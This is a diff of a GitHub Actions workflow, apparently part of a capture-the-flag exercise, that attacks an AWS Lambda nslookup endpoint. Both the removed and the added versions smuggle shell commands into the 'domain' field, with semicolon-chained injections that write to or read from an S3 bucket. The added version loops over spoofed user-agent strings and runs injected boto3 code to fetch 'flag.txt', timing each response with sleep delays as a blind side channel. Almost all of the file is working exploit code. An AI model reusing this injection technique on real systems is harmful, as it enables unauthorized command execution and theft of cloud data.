@@ -1,4 +1,4 @@
-name: Stage2-19-Calibrate-S3-Write
+name: Stage2-20-Test-Real-Lambda-UserAgent
 
 on:
   push:
@@ -24,7 +24,7 @@ jobs:
         run: |
           python3 -m pip install requests requests-aws4auth --quiet
 
-      - name: Calibrate S3 write
+      - name: Test User-Agents inside nslookupv2
         run: |
           python3 - <<'PY'
           import os
@@ -42,32 +42,58 @@ jobs:
               session_token=os.environ["AWS_SESSION_TOKEN"]
           )
 
-          domain = (
-              "example.com; "
-              "printf CTF_PROBE > /tmp/ctf_probe; "
-              "if /opt/aws s3api put-object "
-              "--bucket logad88e2b168aa387e "
-              "--key ctf-probe-calibration.txt "
-              "--body /tmp/ctf_probe "
-              "--region us-east-1 "
-              "--endpoint-url https://s3.us-east-1.amazonaws.com "
-              ">/tmp/aws_result 2>&1; "
-              "then sleep 8; "
-              "fi"
-          )
+          user_agents = [
+              "nslookupv2",
+              "nslookup",
+              "lambdaRole",
+              "AWS_Lambda",
+              "AWSLambda",
+              "CloudEscape",
+              "Amazon CloudFront",
+              "aws-cli",
+              "Boto3",
+              "botocore"
+          ]
 
-          start = time.monotonic()
+          for user_agent in user_agents:
+              python_code = (
+                  "import boto3;"
+                  "from botocore.config import Config;"
+                  "s=boto3.client("
+                  "'s3',"
+                  "region_name='us-east-1',"
+                  "endpoint_url='https://s3.us-east-1.amazonaws.com',"
+                  "config=Config("
+                  f"user_agent={user_agent!r},"
+                  "s3={'addressing_style':'path'}"
+                  ")"
+                  ");"
+                  "s.get_object("
+                  "Bucket='logad88e2b168aa387e',"
+                  "Key='flag.txt'"
+                  ");"
+              )
 
-          response = requests.post(
-              api,
-              json={"domain": domain},
-              auth=auth,
-              timeout=30
-          )
+              injected = (
+                  "example.com; "
+                  "python3 -c "
+                  + repr(python_code)
+                  + " >/tmp/ua_result 2>&1 && sleep 8"
+              )
 
-          elapsed = time.monotonic() - start
+              start = time.monotonic()
 
-          print("HTTP=" + str(response.status_code))
-          print("ELAPSED=%.2f" % elapsed)
-          print(response.text)
+              response = requests.post(
+                  api,
+                  json={"domain": injected},
+                  auth=auth,
+                  timeout=30
+              )
+
+              elapsed = time.monotonic() - start
+
+              print("UA=" + user_agent)
+              print("HTTP=" + str(response.status_code))
+              print("ELAPSED=%.2f" % elapsed)
+              print("---")
           PY
